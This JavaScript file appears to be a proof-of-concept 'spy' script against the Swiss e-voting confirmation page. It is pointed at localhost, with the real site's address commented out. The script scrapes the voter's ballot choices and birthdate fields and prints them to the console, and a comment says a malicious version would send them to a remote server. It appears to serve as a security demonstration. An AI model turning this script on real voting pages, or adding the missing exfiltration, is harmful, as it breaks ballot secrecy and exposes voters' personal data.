document.body.style.border = "5px solid red";

/**
 * Determine whether the spy script should run on this page.
 */
function shouldRun() {
    return window.location.href.startsWith('http://localhost:8000/evoting-confirm.html');
    //return window.location.href.startsWith('https://www.evote-ch.ch/sg');
}

/**
 * Extract questions and answers from voting page.
 */
function getAnswers() {
    const answers = [];
    const items = document.querySelectorAll('#ballot .object_item');
    for (const item of items) {
        const q = item.querySelector('.object_question').innerText;
        const a = item.querySelector('.ballotChoiceBox').innerText;
        answers.push({q: q, a: a});
    }
    return answers;
}

/**
 * Return the birthdate if it was filled out.
 * Return null otherwise.
 */
function getBirthdate() {
    const d = document.querySelector('#n_jour_naissance').value;
    const m = document.querySelector('#n_mois_naissance').value;
    const y = document.querySelector('#n_annee_naissance').value;
    const complete = (!!d && d.length === 2) &&
                     (!!m && m.length === 2) &&
                     (!!y && y.length === 4);
    if (complete) {
        return y + '-' + m + '-' + d;
    } else {
        return null;
    }
}

/**
 * Print the gathered data.
 */
function printData(birthdate) {
    console.log('====== START CH-VOTE SPY ======');
    console.log('Voter:');
    console.log('  Born on ' + birthdate);
    console.log('Votes:');
    const answers = getAnswers();
    for (const answer of answers) {
        console.log('  ' + answer.q);
        console.log('  -> ' + answer.a);
    }
    console.log('====== END CH-VOTE SPY ======');
    console.log('(Note: At this point, a malicious script would send the data to a remote server.)');
}

/**
 * This function is run when the birthdate fields are changed.
 */
function onBirthdateChanged() {
    const birthdate = getBirthdate();
    if (birthdate !== null) {
        printData(birthdate);
    }
}

if (shouldRun()) {
    document.querySelector('#n_jour_naissance').addEventListener('change', onBirthdateChanged);
    document.querySelector('#n_mois_naissance').addEventListener('change', onBirthdateChanged);
    document.querySelector('#n_annee_naissance').addEventListener('change', onBirthdateChanged);
}
